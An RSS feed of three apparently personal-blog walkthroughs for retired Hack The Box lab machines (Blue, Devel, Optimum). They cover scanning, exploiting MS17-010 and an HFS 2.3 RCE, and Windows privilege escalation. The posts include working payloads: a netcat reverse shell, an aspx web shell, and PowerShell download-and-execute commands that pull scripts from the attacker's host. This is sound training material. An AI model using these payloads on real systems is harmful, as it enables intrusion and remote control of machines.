<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Hello</title>
        <link>/posts/</link>
        <description>Recent content in Posts on Hello</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
        <lastBuildDate>Fri, 21 Jun 2019 15:20:00 +0700</lastBuildDate>
        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Blue: Hack The Box Walkthrough</title>
            <link>/posts/2019/06/blue-hack-the-box-walkthrough/</link>
            <pubDate>Fri, 21 Jun 2019 15:20:00 +0700</pubDate>
            
            <guid>/posts/2019/06/blue-hack-the-box-walkthrough/</guid>
            <description>This post documents the complete walkthrough of Blue, a retired vulnerable VM created by ch4p, and hosted at Hack The Box. If you are uncomfortable with spoilers, please stop reading now.
 Background Blue is a retired vulnerable VM from Hack The Box.
Information Gathering Let’s start with a masscan probe to establish the open ports in the host.
# masscan -e tun0 -p0-65535,U:0-65535 10.10.10.40 --rate=5000 Starting masscan 1.</description>
            <content type="html"><![CDATA[

<p><img src="/img/blue.jpg" alt="Optimum" /></p>

<blockquote>
<p>This post documents the complete walkthrough of Blue, a retired vulnerable <a href="https://www.hackthebox.eu/home/machines/profile/51" target="_blank">VM</a> created by <a href="https://www.hackthebox.eu/home/users/profile/1" target="_blank">ch4p</a>, and hosted at <a href="https://www.hackthebox.eu/" target="_blank">Hack The Box</a>. If you are uncomfortable with spoilers, please stop reading now.</p>
</blockquote>

<h2 id="background">Background</h2>

<p>Blue is a retired vulnerable VM from Hack The Box.</p>

<h2 id="information-gathering">Information Gathering</h2>

<p>Let’s start with a <code>masscan</code> probe to establish the open ports in the host.</p>

<pre><code># masscan -e tun0 -p0-65535,U:0-65535 10.10.10.40 --rate=5000

Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2019-06-21 06:23:11 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 49155/tcp on 10.10.10.40                                  
Discovered open port 49154/tcp on 10.10.10.40                                  
Discovered open port 49157/tcp on 10.10.10.40                                  
Discovered open port 135/tcp on 10.10.10.40                                    
Discovered open port 49153/tcp on 10.10.10.40                                  
Discovered open port 139/tcp on 10.10.10.40                                    
Discovered open port 445/tcp on 10.10.10.40                                    
Discovered open port 49156/tcp on 10.10.10.40                                  
Discovered open port 49152/tcp on 10.10.10.40 
</code></pre>

<p><img src="/img/blue_1.png" alt="masscan_result" /></p>

<p><code>masscan</code> find nine open ports. Let&rsquo;s do one better with <code>nmap</code> scanning the discovered ports.</p>

<pre><code># nmap -sS -sC -sV -Pn -n --randomize-hosts --send-eth --reason -vv -T4 -A -p
135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 -oX blue.xml
...
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC

Host script results:
|_clock-skew: mean: -22m27s, deviation: 34m35s, median: -2m29s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 31175/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12383/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19006/udp): CLEAN (Timeout)
|   Check 4 (port 5326/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-06-21T07:31:23+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-06-21 13:31:21
|_  start_date: 2019-06-19 21:34:25
</code></pre>

<p><img src="/img/blue_2.png" alt="nmap_result" /></p>

<p>Hmm. Nothing catches eyes except there is port <code>445</code>, let&rsquo;s try nmap scanning again but this time with <code>--script vuln</code> option. Just in case if there is some vulnerabilities like <code>EternalBlue</code> for example.</p>

<pre><code># nmap --script vuln -sS -Pn -n --randomize-hosts --send-eth --reason -vv -T4 -p 445 10.10.10.40
...
PORT    STATE SERVICE      REASON
445/tcp open  microsoft-ds syn-ack ttl 127

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
</code></pre>

<p><img src="/img/blue_3.png" alt="nmap_vuln_result" /></p>

<p>Wow, what do we got here 👀. The box is indeed vulnerable to <code>ms17-010</code> aka <code>EternalBlue</code>, looks like the name of the box give us some hint after all.</p>

<p>From out first scan, we know that the OS of the box is <code>Windows 7 SP1</code>. In here I&rsquo;m going to use <a href="https://github.com/worawit/MS17-010" target="_blank">zzz_exploit.py</a>. Don&rsquo;t forget to download the <code>mysmb.py</code> and install <a href="https://github.com/SecureAuthCorp/impacket" target="_blank">impacket</a> too because the script is dependent of it. Otherwise we&rsquo;ll caught some error.</p>

<pre><code>Host script results:
|_  smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-06-21T07:31:23+01:00
</code></pre>

<p>But, because the original version of <code>zzz_exploit.py</code> need some editing to be able to send file (e.g <code>nc.exe</code>) I&rsquo;ve made some edit to the file and uploaded it <a href="https://gist.github.com/EasyNV/3888ce78a00dc92e12b859ec6a64d69e" target="_blank">here</a>.</p>

<p>Now we&rsquo;re going to run the exploit, don&rsquo;t forget to change the <code>USERNAME</code> values on the <code>.py</code> file into <code>'//'</code> because we&rsquo;re going to use guest authentication in here. The file that I&rsquo;m going to send and run is <code>nc.exe</code>. Then, just call this command on our terminal.</p>

<p><code>python zzz_exploit.py 10.10.10.40 nc.exe</code></p>

<p><img src="/img/blue_4.png" alt="locate_nc_and_copy" /></p>

<p><img src="/img/blue_5.png" alt="nc_listen_on_another_tab" /></p>

<p><img src="/img/blue_6.png" alt="running_the_exploit" /></p>

<p><img src="/img/blue_7.png" alt="whoami_command_execution" /></p>

<p><img src="/img/blue_8.png" alt="user_and_root_flag" /></p>

<p>Nice! Got all the flag! 💃.</p>
]]></content>
        </item>
        
        <item>
            <title>Devel: Hack The Box Walkthrough</title>
            <link>/posts/2019/06/devel-hack-the-box-walkthrough/</link>
            <pubDate>Thu, 20 Jun 2019 21:20:00 +0700</pubDate>
            
            <guid>/posts/2019/06/devel-hack-the-box-walkthrough/</guid>
            <description>This post documents the complete walkthrough of Devel, a retired vulnerable VM created by ch4p, and hosted at Hack The Box. If you are uncomfortable with spoilers, please stop reading now.
 Background Devel is a retired vulnerable VM from Hack The Box.
Information Gathering Let&amp;rsquo;s start with masscan to enumerate the open ports in this host.
# masscan -e tun0 -p0-65535,U:0-65535 10.10.10.5 --rate=1000 Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2019-06-19 09:14:33 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131072 ports/host] Discovered open port 80/tcp on 10.</description>
            <content type="html"><![CDATA[

<p><img src="/img/devel.jpg" alt="Devel" /></p>

<blockquote>
<p>This post documents the complete walkthrough of Devel, a retired vulnerable <a href="https://www.hackthebox.eu/home/machines/profile/3" target="_blank">VM</a> created by <a href="https://www.hackthebox.eu/home/users/profile/1" target="_blank">ch4p</a>, and hosted at <a href="https://www.hackthebox.eu/" target="_blank">Hack The Box</a>. If you are uncomfortable with spoilers, please stop reading now.</p>
</blockquote>

<h2 id="background">Background</h2>

<p>Devel is a retired vulnerable VM from Hack The Box.</p>

<h2 id="information-gathering">Information Gathering</h2>

<p>Let&rsquo;s start with <code>masscan</code> to enumerate the open ports in this host.</p>

<pre><code># masscan -e tun0 -p0-65535,U:0-65535 10.10.10.5 --rate=1000

Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2019-06-19 09:14:33 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 80/tcp on 10.10.10.5
Discovered open port 21/tcp on 10.10.10.5
</code></pre>

<p>Alright, now we have 2 open ports which is <code>FTP</code> and <code>HTTP</code>. Now let&rsquo;s do a better scan with <code>nmap</code> on the discovered ports.</p>

<pre><code># nmap -sS -Pn -n --randomize-hosts --send-eth -vv -T4 -A -p 21,80 -oX devel.xml 10.10.10.5
...
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
</code></pre>

<p>Wow this is interesting, we could login to the <code>FTP</code> anonymously. Furthermore I think the IIS page is hosted on the <code>FTP</code> server folder. But let&rsquo;s try if we have <code>write</code> command or not into the box.</p>

<p>Yup, turns out we got a <code>write</code> access to the <code>FTP</code> as I&rsquo;m able to write <code>test.html</code> into the <code>FTP</code>.</p>

<p><img src="/img/devel_1.png" alt="Devel_1" /></p>

<p><img src="/img/devel_2.png" alt="Devel_2" /></p>

<p>Alright! Our assumption about the <code>FTP</code> server is hosted on the same folder with IIS was true. Let&rsquo;s try to make some <code>.aspx</code> shell then. I&rsquo;m going to use <code>cmd.aspx</code> for the shell. You can find it on your Kali machine with <code>locate cmd.aspx</code></p>

<p><img src="/img/devel_3.png" alt="Devel_3" /></p>

<p><img src="/img/devel_4.png" alt="Devel_4" /></p>

<p>Nice, after this we are going to need <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py" target="_blank">smbshare.py</a> and <code>nc.exe</code>, you can use <code>locate</code> to find them in your kali machine. Because the box is a windows box we can use smb to make the box remotely open our exe and make it run it there.</p>

<p>This is the command that I use to run the <code>smbshare.py</code></p>

<p><code>python3 smbshare.py share .</code></p>

<p>And from the <code>cmd.aspx</code> we&rsquo;re going to use this command so we could run <code>nc.exe</code> remotely.</p>

<p><code>\\10.10.14.45\share\nc.exe -e cmd.exe 10.10.14.45 1337</code></p>

<p><img src="/img/devel_6.png" alt="Devel_6" /></p>

<p><img src="/img/devel_7.png" alt="Devel_7" /></p>

<p><img src="/img/devel_8.png" alt="Devel_8" /></p>

<p><img src="/img/devel_9.png" alt="Devel_9" /></p>

<p>Great now we got some shell running! Let&rsquo;s enumerate the box a bit. We will start with <code>systeminfo</code> from our shell. And we got this as the output</p>

<pre><code>Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          23/6/2019, 9:53:47 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~1996 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 3/7/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 742 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 1.379 MB
Virtual Memory: In Use:    668 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
</code></pre>

<p>Great, from here we know that our box is a 32 bit machine. Let&rsquo;s use <a href="https://github.com/rasta-mouse/Watson" target="_blank">watson</a> (AFAIK the current version of <code>watson</code> do not work well in this box, so we can use the one from <a href="https://github.com/rasta-mouse/Watson/tree/486ff207270e4f4cadc94ddebfce1121ae7b5437" target="_blank">here</a>) to enumerate the system further, but before that because <code>watson</code> is dependent of <code>.NET</code> framework, let&rsquo;s search what <code>.NET</code> version is installed on the box.</p>

<p>There is 2 way for this, first we could search from the <code>registry</code> or we could search from the directory. In here I&rsquo;ll use the directory one, but just in case you prefer the <code>registry</code> way, I&rsquo;ll drop the command below.</p>

<p>Registry</p>

<p><code>reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP&quot;</code></p>

<p>Directory</p>

<p><code>cd C:\Windows\Microsoft.NET\Framework</code></p>

<p><code>dir /A:D</code></p>

<p><img src="/img/devel_10.png" alt="Devel_10" /></p>

<p>Okay, so the latest <code>.NET</code> version is 3.5. Let&rsquo;s build our watson so we can run it on the box. I&rsquo;ll use my windows vm to compile it.</p>

<p>From here we are going to need <code>Visual Studio</code> to compile it. First after you download the zip from the github page, I&rsquo;m going to open <code>watson.sln</code> on the <code>Visual Studio</code>. Then I&rsquo;ll go to the Visual Studio menu and open Project -&gt; Watson Properties. I’ll make sure Application is selected on the menu on the left, and there I should be able to set the “Target framework”:</p>

<p><img src="/img/devel_11.png" alt="Devel_11" /></p>

<p>I&rsquo;ll set it to 3.5 since that’s the latest that’s installed on target.</p>

<p>Next, I’ll go to Build –&gt; Configuration Manager. This let’s me set the architecture (x86 vs x64) for the output binary. I remember from the <code>systeminfo</code> output that it was a x64 processor, but that the OS was x86:</p>

<pre><code>Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          23/6/2019, 9:53:47 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~1996 Mhz
</code></pre>

<p>I&rsquo;ll change the Platform to x86:</p>

<p><img src="/img/devel_12.png" alt="Devel_12" /></p>

<p>Now I&rsquo;ll go to Build –&gt; Build Watson. In the bottom Window I should see:</p>

<p><img src="/img/devel_13.png" alt="Devel_13" /></p>

<p>I&rsquo;ll go to that path, and get a copy of the output exe, and transfer it back to my Kali box and drop it in my smb folder.</p>

<p>Now I’ll run it directly from the SMB share, just like I did nc:</p>

<pre><code> / / /\ \ \__ _| |_ ___  ___  _ __  
 \ \/  \/ / _` | __/ __|/ _ \| '_ \ 
  \  /\  / (_| | |_\__ \ (_) | | | |
   \/  \/ \__,_|\__|___/\___/|_| |_|
                                   
                           v0.1    
                                   
                  Sherlock sucks...
                   @_RastaMouse

 [*] OS Build number: 7600
 [*] CPU Address Width: 32
 [*] Process IntPtr Size: 4
 [*] Using Windows path: C:\WINDOWS\System32

  [*] Appears vulnerable to MS10-073
   [&gt;] Description: Kernel-mode drivers load unspecified keyboard layers improperly, which result in arbitrary code execution in the kernel.
   [&gt;] Exploit: https://www.exploit-db.com/exploits/36327/
   [&gt;] Notes: None.

  [*] Appears vulnerable to MS10-092
   [&gt;] Description: When processing task files, the Windows Task Scheduler only uses a CRC32 checksum to validate that the file has not been tampered with.Also, In a default configuration, normal users can read and write the task files that they have created.By modifying the task file and creating a CRC32 collision, an attacker can execute arbitrary commands with SYSTEM privileges.
   [&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_092_schelevator.rb
   [&gt;] Notes: None.

  [*] Appears vulnerable to MS11-046
   [&gt;] Description: The Ancillary Function Driver (AFD) in afd.sys does not properly validate user-mode input, which allows local users to elevate privileges.
   [&gt;] Exploit: https://www.exploit-db.com/exploits/40564/
   [&gt;] Notes: None.

  [*] Appears vulnerable to MS12-042
   [&gt;] Description: An EoP exists due to the way the Windows User Mode Scheduler handles system requests, which can be exploited to execute arbitrary code in kernel mode.
   [&gt;] Exploit: https://www.exploit-db.com/exploits/20861/
   [&gt;] Notes: None.

  [*] Appears vulnerable to MS13-005
   [&gt;] Description: Due to a problem with isolating window broadcast messages in the Windows kernel, an attacker can broadcast commands from a lower Integrity Level process to a higher Integrity Level process, thereby effecting a privilege escalation.
   [&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms13_005_hwnd_broadcast.rb
   [&gt;] Notes: None.

 [*] Finished. Found 5 vulns :)
ERROR&gt; The given key was not present in the dictionary.
ERROR&gt; C:\WINDOWS\System32\win32kfull.sys
ERROR&gt; C:\WINDOWS\System32\gdiplus.dll
ERROR&gt; C:\WINDOWS\System32\coremessaging.dll
</code></pre>

<p><img src="/img/devel_14.png" alt="Devel_14" /></p>

<h1 id="ms11-046-aka-the-path-to-root">MS11-046 aka the Path to Root</h1>

<p>A lot of these will have Metasploit modules. But because I&rsquo;m going to do this without Metasploit, I&rsquo;ll make use of a GitHub out there from SecWiki called <a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank">windows-kernel-exploits</a>. He’s got a folder for MS11-046 with a precompiled exe. If I look through the <a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/CVE-2011-1249.c" target="_blank">source</a> at the very bottom I’ll see this comment:</p>

<p><code>// spawn SYSTEM shell within the current shell (remote shell friendly)</code></p>

<p>That&rsquo;s exactly what I&rsquo;m looking for. A sticking point for a lot of these precompiled exploits is that they launch a new elevated cmd shell, which is only useful if I have remote desktop or keyboard access.</p>

<p>I&rsquo;ll save the exe in my smb share, and run it, and it doesn’t print anything, but I get a new shell as system:</p>

<p><img src="/img/devel_15.png" alt="Devel_15" /></p>

<p>Great! Now we got the system shell. So we&rsquo;re just need to use <code>type</code> to get the flag. 💃.</p>

<p><img src="/img/devel_16.png" alt="Devel_16" /></p>

<p><img src="/img/devel_17.png" alt="Devel_17" /></p>
]]></content>
        </item>
        
        <item>
            <title>Optimum: Hack The Box Walkthrough</title>
            <link>/posts/2019/06/optimum-hack-the-box-walkthrough/</link>
            <pubDate>Tue, 18 Jun 2019 22:00:00 +0700</pubDate>
            
            <guid>/posts/2019/06/optimum-hack-the-box-walkthrough/</guid>
            <description>This post documents the complete walkthrough of Optimum, a retired vulnerable VM created by ch4p, and hosted at Hack The Box. If you are uncomfortable with spoilers, please stop reading now.
 Background Optimum is a retired vulnerable VM from Hack The Box.
Information Gathering Let&amp;rsquo;s start with masscan to enumerate the open ports in this host.
masscan -e tun0 -p0-65535,U:0-65535 10.10.10.8 --rate=1000 Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2019-06-18 15:36:07 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131072 ports/host] Discovered open port 80/tcp on 10.</description>
            <content type="html"><![CDATA[

<p><img src="/img/optimum.jpg" alt="Optimum" /></p>

<blockquote>
<p>This post documents the complete walkthrough of Optimum, a retired vulnerable <a href="https://www.hackthebox.eu/home/machines/profile/6" target="_blank">VM</a> created by <a href="https://www.hackthebox.eu/home/users/profile/1" target="_blank">ch4p</a>, and hosted at <a href="https://www.hackthebox.eu/" target="_blank">Hack The Box</a>. If you are uncomfortable with spoilers, please stop reading now.</p>
</blockquote>

<h2 id="background">Background</h2>

<p>Optimum is a retired vulnerable VM from Hack The Box.</p>

<h2 id="information-gathering">Information Gathering</h2>

<p>Let&rsquo;s start with <code>masscan</code> to enumerate the open ports in this host.</p>

<pre><code>masscan -e tun0 -p0-65535,U:0-65535 10.10.10.8 --rate=1000

Starting masscan 1.0.6 (http://bit.ly/14GZzcT) at 2019-06-18 15:36:07 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 80/tcp on 10.10.10.8
</code></pre>

<p>Only 1 open port? Alright, let&rsquo;s open it on our web browser then.</p>

<p><img src="/img/optimum_1.png" alt="Optimum_1" /></p>

<p>Interesting, from here we know that the webserver is running <code>HttpFileServer 2.3</code>. A quick google search about this show us about the RCE vulnerability.</p>

<p><img src="/img/optimum_2.png" alt="Optimum_2" /></p>

<pre><code>The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server 
(aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to 
execute arbitrary programs via a %00 sequence in a search action.
</code></pre>

<p>Sweet! Now let&rsquo;s try our RCE then. Let&rsquo;s fire up some burp.</p>

<p><img src="/img/optimum_3.png" alt="Optimum_3" /></p>

<p>I&rsquo;m going to use this payload to test the RCE <code>?search=%00{.exec|ping+10.10.14.45.}</code>. You can read more about why I use that payload <a href="https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands" target="_blank">here</a>.</p>

<p>And then when running tcpdump, we got a response from the Box!</p>

<p><img src="/img/optimum_4.png" alt="Optimum_4" /></p>

<p>Sweet! Now we know that our RCE really work, let&rsquo;s create a powershell shell to communicate with the box! I&rsquo;m going to use <a href="https://github.com/samratashok/nishang" target="_blank">nishang</a> <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">Invoke-PowerShellTcp.ps1</a> here. Don&rsquo;t forget to add <code>Invoke-PowerShellTcp -Reverse -IPAddress Your_IP -Port Your_Port</code> by the end of the file.</p>

<p>And then because most of Hack The Box boxes is made from 64 bit machine, I&rsquo;m assuming this one too. So let&rsquo;s try to call the 64 bit powershell and then ping our machine back with this payload</p>

<p><code>?search=%00{.exec|C%3a\Windows\Sysnative\WindowsPowershell\v1.0\powershell.exe+ping+10.10.14.45.}</code></p>

<p>And yeah, don&rsquo;t forget to url encode our payload!</p>

<p><img src="/img/optimum_5.png" alt="Optimum_5" /></p>

<p>Nice! We got response from the box, turns out my assumption was right about this box being a 64 bit. Now let&rsquo;s try to call our nishang shell.</p>

<p>I&rsquo;ll start by running webserver from my box and then let the box download the <code>.ps1</code> script, this is the payload that I use</p>

<p><code>?search=%00{.exec|C%3a\Windows\Sysnative\WindowsPowershell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadstring('http%3a//10.10.14.45/Invoke-PowerShellTcp.ps1').}</code></p>

<p><img src="/img/optimum_6.png" alt="Optimum_6" /></p>

<p><img src="/img/optimum_7.png" alt="Optimum_7" /></p>

<p>Nice! Got <code>user.txt</code>!</p>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<p>Privilege escalation is pretty straight forward from here. Let&rsquo;s start by enumerating the system, in here I&rsquo;m going to use <a href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1" target="_blank">Sherlock</a> to enumerate the system. Don&rsquo;t forget to add <code>Find-AllVulns</code> by the end of the code.</p>

<p>Because our shell is already a powershell, I&rsquo;m going to use this command to download the <code>.ps1</code> script from my system.</p>

<p><code>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/Sherlock.ps1')</code></p>

<p><img src="/img/optimum_8.png" alt="Optimum_8" /></p>

<p>From here, <code>Sherlock</code> indicating that this box appeared to be vulnerable to <code>MS16-032 Secondary Logon Handle Privilege Escalation</code>.</p>

<p>Because of that, I&rsquo;m going to use <a href="https://github.com/EmpireProject/Empire" target="_blank">Empire</a> <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1" target="_blank">Invoke-MS16032.ps1</a> script.</p>

<p>Don&rsquo;t forget to add <code>Invoke-MS16032 -Command &quot;IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/sh.ps1')&quot;</code> by the end of the script.</p>

<p>I&rsquo;m going to use this payload to run the <code>Empire</code> script on the box.</p>

<p><code>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/Invoke-MS16032.ps1')</code>.</p>

<p><img src="/img/optimum_9.png" alt="Optimum_9" /></p>

<p><img src="/img/optimum_10.png" alt="Optimum_10" /></p>

<p>Got <code>root.txt</code> 💃.</p>
]]></content>
        </item>
        
    </channel>
</rss>
